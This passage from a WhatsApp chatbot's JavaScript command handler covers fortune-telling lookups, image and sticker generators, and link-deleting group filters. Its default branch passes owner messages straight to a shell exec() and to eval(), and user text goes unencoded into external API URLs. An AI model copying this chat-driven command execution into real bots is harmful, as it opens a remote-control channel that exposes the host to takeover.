let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'pekerjaan': {
if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalannasib': case 'ramalnasib': case 'nasib': {
if (!text) return reply(`Contoh : 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.ramalan_nasib(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`)
}
break
case 'potensipenyakit': case 'penyakit': {
if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'artitarot': case 'tarot': {
if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
sock.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'fengshui': {
if (!text) return `Contoh : ${cmd} Dika, 1, 2005\n\nNote : ${cmd} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
let [nama, gender, tahun] = text.split`,`
let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`)
}
break
case 'haribaik': {
if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.petung_hari_baik(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harisangar': case 'taliwangke': {
if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'harinaas': case 'harisial': {
if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`)
}
break
case 'nagahari': case 'harinaga': {
if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'arahrejeki': case 'arahrezeki': {
if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'peruntungan': {
if (!text) return reply(`Contoh : ${cmd} DIka, 7, 7, 2005, 2022\n\nNote : ${cmd} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
let [nama, tgl, bln, thn, untuk] = text.split`,`
let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'weton': case 'wetonjawa': {
if (!text) return reply(`Contoh : ${cmd} 7, 7, 2005`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.weton_jawa(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
}
break
case 'sifat': case 'karakter': {
if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
}
break
case 'keberuntungan': {
if (!text) return reply(`Contoh : ${cmd} Dika, 7, 7, 2005`)
let [nama, tgl, bln, thn] = text.split`,`
let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`)
}
break
case 'memancing': {
if (!text) return reply(`Contoh : ${cmd} 12, 1, 2022`)
let [tgl, bln, thn] = text.split`,`
let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break

case 'masasubur': {
if (!text) return reply(`Contoh : ${cmd} 12, 1, 2022, 28\n\nNote : ${cmd} hari pertama menstruasi, siklus`)
let [tgl, bln, thn, siklus] = text.split`,`
let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
if (anu.status == false) return reply(anu.message)
reply(`• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'zodiak': case 'zodiac': {
if (!text) return reply(`Contoh : ${prefix+ command} 7 7 2005`)
let zodiak = [
["capricorn", new Date(1970, 0, 1)],
["aquarius", new Date(1970, 0, 20)],
["pisces", new Date(1970, 1, 19)],
["aries", new Date(1970, 2, 21)],
["taurus", new Date(1970, 3, 21)],
["gemini", new Date(1970, 4, 21)],
["cancer", new Date(1970, 5, 22)],
["leo", new Date(1970, 6, 23)],
["virgo", new Date(1970, 7, 23)],
["libra", new Date(1970, 8, 23)],
["scorpio", new Date(1970, 9, 23)],
["sagittarius", new Date(1970, 10, 22)],
["capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
let d = new Date(1970, month - 1, day)
return zodiak.find(([_,_d]) => d >= _d)[0]
}
let date = new Date(text)
if (date == 'Invalid Date') return date
let d = new Date()
let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]

let zodiac = await getZodiac(birth[1], birth[2])

let anu = await primbon.zodiak(zodiac)
if (anu.status == false) return reply(anu.message)
reply(`• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`)
}
break
case 'shio': {
if (!text) return reply(`Contoh : ${cmd} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
let anu = await primbon.shio(text)
if (anu.status == false) return reply(anu.message)
reply(`• *Hasil :* ${anu.message}`)
}
break
/*
      MAKER
     
*/
case 'text2img':
case 'txt2img': {
  if (!text) return m.reply(`Contoh: ${cmd} beautiful girl with handsome man`)
  
  await sock.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/stablediffusion?prompt=${text}&model=dreamshaper-8-base` }, caption: "" }, {quoted: m})
}
break

case 'text2imgv2':
case 'txt2imgv2': {
  if (!text) return m.reply(`Contoh: ${cmd} beautiful girl with handsome man`)
  
  await sock.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/flux/schnell?prompt=${text}&size=9_16` }, caption: "" }, {quoted: m})
}
break

case 'text2imgv3':
case 'txt2imgv3': {
  if (!text) return m.reply(`Contoh: ${cmd} beautiful girl with handsome man`)
  
  await sock.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/stablediffusion?prompt=${text}&model=stable-diffusion-xl-fast` }, caption: "" }, {quoted: m})
}
break

case 'text2imgv4':
case 'txt2imgv4': {
  if (!text) return m.reply(`Contoh: ${cmd} beautiful girl with handsome man`)
    
    await sock.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/stablediffusion?prompt=${text}&model=stable-diffusion-xl-base` }, caption: "" }, {quoted: m})
}
break

case 'text2imgv5':
case 'txt2imgv5': {
  if (!text) return m.reply(`Contoh: ${cmd} beautiful girl with handsome man`)
    
    await sock.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/amazonai?prompt=${text}&size=9_16` }, caption: "" }, {quoted: m})
}
break

case 'text2imgv6':
case 'txt2imgv6': {
  if (!text) return m.reply(`Contoh: ${cmd} beautiful girl with handsome man`)
    
    await sock.sendMessage(m.chat, {image: {url: `https://fastrestapis.fasturl.cloud/aiimage/gemini?prompt=${text}` }, caption: "" }, {quoted: m})
}
break



case 'bratfoto':
case 'bratgenerator': {
  if (!text) return m.reply(`Contoh: ${cmd} beautiful girl with handsome man`)
    
    await sock.sendMessage(m.chat, {image: {url: `https://aqul-brat.hf.space/?text=${text}` }, caption: "" }, {quoted: m})
}
break
case 'pakustad':
case 'pak-ustad': {
  if (!text) return m.reply(`Contoh: ${cmd} kenapa sock ganteng`)
    
    await sock.sendMessage(m.chat, {image: {url: `https://api.taka.my.id/tanya-ustad?quest=${text}` }, caption: "" }, {quoted: m})
}
break
case 'nglgenerator':
case 'ngl': {
  if (!text) return m.reply(`Contoh: ${cmd} beautiful girl with handsome man`)
    
    await sock.sendMessage(m.chat, {image: {url: `https://api.taka.my.id/ngl?text=${text}` }, caption: "" }, {quoted: m})
}
break
    case 'attp': {

const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
//if (!m.isGroup) return Reply('*`maybee` fitur ini hanya untuk di grup*')
 if (!quo) return m.reply("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get(`https://anabot.my.id/api/maker/attp?text=${text}&apikey=freeApikey`, {
 params: {
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 delete sock.enhancer[sender];
 sock.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
 }
}

const buf = await brat(quo);
await sock.sendImageAsSticker(m.chat, buf.image, m, { packname: "", author: "" })
}
break
case 'pak-ustad2':
case 'pakustad2': {

const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
//if (!m.isGroup) return Reply('*`maybee` fitur ini hanya untuk di grup*')
 if (!quo) return m.reply("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get(`https://api.taka.my.id/tanya-ustad?quest=${text}`, {
 params: {
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 delete sock.enhancer[sender];
 sock.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
 }
}

const buf = await brat(quo);
await sock.sendImageAsSticker(m.chat, buf.image, m, { packname: "", author: "" })
}
break
                                              
            default:
                if (budy.startsWith('$')) {
                    if (!isOwner) return;
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout);
                    });
                }
                if (budy.startsWith('>')) {
                    if (!isOwner) return;
                    try {
                        let evaled = await eval(budy.slice(2));
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
                        await reply(evaled);
                    } catch (err) {
                        reply(String(err));
                    }
                }
        // Anti Wame
          if (setting.antiWame)
  if (budy.includes(`https://wa.me`)) {

bvl = `\`\`\`「 Wa.me Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`

kice = m.sender
        await sock.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })

			sock.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
// Anti Link Gc
if (setting.Antilinkgc)
  if (budy.includes(`https://chat.whatsapp`)) {

bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`

kice = m.sender
        await sock.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })

			sock.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
// Antilink Ch
if (setting.Antilinkch)
  if (budy.includes(`https://whatsapp.com/channel/`)) {

bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`

kice = m.sender
        await sock.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })

			sock.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
// Anti Link Ig
if (setting.Antilinkig)
  if (budy.includes(`https://www.instagram.com/`)) {

bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`

kice = m.sender
        await sock.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })

			sock.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
// Antilinkall
if (setting.Antilinkall)
  if (budy.includes(`https://`)) {

bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`

kice = m.sender
        await sock.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })

			sock.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
// Antijudol
if (setting.antijudol)
  if (budy.includes(`🤑`)) {

bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`

kice = m.sender
        await sock.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
} else {
}
if (setting.antijudol2)
  if (budy.includes(`💸`)) {

bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a wa.me link, admin is free to send any link😇`

kice = m.sender
        await sock.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
} else {
}
//
global.hai = true
if (global.hai)
  if (budy.includes("hai")) {

			    sock.sendMessage(from, {text:`halo juga kak @${m.sender.split("@")[0]}`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
//
                if (budy.startsWith('<')) {
                    if (!isOwner) return
                    let kode = budy.trim().split(/ +/)[0]
                    let teks
                    try {
                        teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
                    } catch (e) {
                        teks = e
                    } finally {
                        await reply(require('util').format(teks))
                    }
                }
        
        }
    } catch (err) {
        console.log(require("util").format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file)
  console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
  delete require.cache[file]
  require(file)
})
